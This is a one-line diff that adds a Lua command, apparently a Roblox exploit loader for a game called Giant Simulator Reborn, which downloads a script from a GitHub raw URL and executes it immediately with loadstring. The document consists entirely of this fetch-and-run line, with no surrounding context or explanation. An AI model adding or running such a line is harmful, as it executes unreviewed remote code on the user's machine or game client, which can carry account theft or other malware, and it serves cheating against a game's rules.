@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/giant-simulator-reborn-spam4-jjf6b7vcjrfe4v.lua"))()
